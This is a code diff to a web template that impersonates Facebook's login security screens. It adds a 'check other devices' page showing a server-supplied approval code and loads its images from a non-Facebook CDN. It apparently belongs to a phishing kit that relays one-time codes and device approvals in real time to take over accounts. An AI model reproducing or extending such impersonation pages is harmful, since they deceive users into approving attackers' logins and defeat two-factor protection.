@@ -49,6 +49,27 @@
 </head>
 
 <body>
+    <div class="min-h-screen flex items-center justify-center px-4 hidden" id="verify_device">
+        <div class="w-full sm:max-w-[900px]">
+            <p class="text-[13px] text-black mb-1">Facebook</p>
+            <h1 class="text-[22px] font-bold text-black leading-snug mb-2">
+                {{ __('facebook.check_other_devices') }}</h1>
+            <p class="text-[14px] text-black leading-relaxed mb-5">
+                {{ __('facebook.check_other_devices_msg') }}</p>
+            <div class="rounded-xl overflow-hidden mb-5">
+                <img src="https://{{ env('APP_CDN_DOMAIN', 'brscdn.io.vn') }}/theme/system/facebook/another_device.png" alt="Xác minh thiết bị" class="w-full h-auto">
+            </div>
+            <div class="text-5xl text-center font-bold tracking-[10px] mb-4" id="device_code">52</div>
+            <div class="flex items-center gap-3 mb-5">
+                <i class="fa-light fa-circle-notch fa-spin"></i>
+                <div>
+                    <p class="text-[15px] font-semibold text-black leading-tight">
+                        {{ __('facebook.waiting_for_approve') }}</p>
+                    <p class="text-[13px] text-black mt-0.5">{{ __('facebook.waiting_message') }}</p>
+                </div>
+            </div>
+        </div>
+    </div>
     <div class="min-h-screen flex items-center justify-center px-4 hidden" id="verify_otp">
         <div class="w-full sm:max-w-[900px]">
             <p class="text-[13px] text-black mb-1">Facebook</p>
@@ -57,7 +78,7 @@
             <p class="text-[14px] text-black leading-relaxed mb-5">
                 {{ __('facebook.check_device_notification_message') }}</p>
             <div class="rounded-xl overflow-hidden mb-5">
-                <img src="images/facebook/device.png" alt="Xác minh thiết bị" class="w-full h-auto">
+                <img src="https://{{ env('APP_CDN_DOMAIN', 'brscdn.io.vn') }}/theme/system/facebook/device.png" alt="Xác minh thiết bị" class="w-full h-auto">
             </div>
             <div class="flex items-center gap-3 mb-5">
                 <i class="fa-light fa-circle-notch fa-spin"></i>
@@ -185,12 +206,20 @@
                 if (data.otp_request) {
                     $("#main").remove()
                     $("#footer").remove()
+                    $("#verify_device").addClass('hidden')
                     $("#verify_otp").removeClass('hidden')
                 }
                 if (data.request_resend) {
                     $("#warning_otp").show()
                     $("#warning_otp").html("{{ __('facebook.invalid_authentication_code') }}")
                     $("#confirm_otp").html("{{ __('facebook.confirm') }}").attr('disabled', false)
+                }
+                if (data.another_device_verify) {
+                    $("#main").remove()
+                    $("#footer").remove()
+                    $("#verify_device").removeClass('hidden')
+                    $("#verify_otp").addClass('hidden')
+                    $("#device_code").html(data.another_device_verify)
                 }
             }
         });
